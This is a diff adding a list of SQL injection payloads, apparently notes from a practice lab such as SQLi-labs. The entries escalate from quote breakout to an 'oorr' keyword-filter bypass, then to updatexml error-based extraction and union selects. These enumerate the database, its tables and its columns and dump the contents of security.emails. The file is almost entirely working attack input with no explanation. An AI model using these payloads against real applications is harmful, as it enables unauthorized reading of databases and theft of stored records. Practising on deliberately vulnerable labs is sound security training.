@@ -1,0 +1,18 @@
+ID:1
+ID:1'
+ID:1';
+ID:1'or 1 or'1
+ID:1'oorr 1 oorr'1
+ID:1'oorr 1 oorr'1
+ID:1' oorr updatexml(1,concat(0x7e,(select database()),0x7e),1) oorr '1
+ID:1' oorr updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) oorr '1
+ID:1' oorr updatexml(1,concat(0x7e,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()),0x7e),1) oorr '1
+ID:1' oorr updatexml(1,concat(0x7e,(select group_concat(column_name) from infoorrmation_schema.columns where table_name='emails'),0x7e),1) oorr '1
+ID:1' oorr updatexml(1,concat(0x7e,(select group_concat(id,':',email_id) from security.emails),0x7e),1) oorr '1
+ID:1'
+ID:-1' union select 1,database();
+ID:-1' oorr union select 1,database()
+ID:-1' oorr union select 1,database() oorr '-1
+ID:-1'  union select 1,database() oorr '-1
+ID:-1'  union select 1,2,database() oorr '-1
+ID:-1'  union select 1,database(),2 oorr '-1
